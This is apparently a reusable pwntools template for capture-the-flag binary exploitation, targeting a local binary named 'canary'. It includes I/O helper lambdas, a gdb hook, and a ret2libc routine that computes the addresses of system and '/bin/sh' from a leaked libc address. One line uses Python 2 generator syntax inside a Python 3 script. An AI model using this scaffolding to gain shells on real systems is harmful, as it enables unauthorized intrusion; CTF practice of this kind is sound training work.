#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# paste from self-used pwn-libs.
import pwn
from LibcSearcher import LibcSearcher

pwn.context(log_level = 'debug', arch = 'amd64', os = 'linux')

# change sth is up to you.
filename = 'canary'
libc_path = ''
remote_ip = ''
remote_port = ''

if not (filename == ''):
	io = pwn.process(filename)
else:
	io = pwn.remote(remote_ip, remote_port)

elf = pwn.ELF(filename)

send            = lambda payload            :io.send(payload)
sendline        = lambda payload            :io.sendline(payload)
sendafter       = lambda recv, payload      :io.sendafter(recv, payload)
sendlineafter   = lambda recv, payload      :io.sendlineafter(recv, payload)

recv            = lambda msg                :io.recv(msg)
recvuntil       = lambda msg, drop = True   :io.recvuntil(msg, drop)

p32				= lambda sth				:pwn.p32(sth)
p64				= lambda sth				:pwn.p64(sth)

leak            = lambda sth, addr          :pwn.log.success('{} => {:#x}'.format(sth, addr))
u32             = lambda bytes              :pwn.u32(bytes.ljust(4, b'\0'))
u64             = lambda bytes              :pwn.u64(bytes.ljust(8, b'\0'))

interactive     = lambda                    :io.interactive()

def dbg():
    pwn.gdb.attach(io)
    pwn.pause()

def ret2libc(leak, func, libc_path = ''):
	if libc_path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = pwn.ELF(libc_path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

# end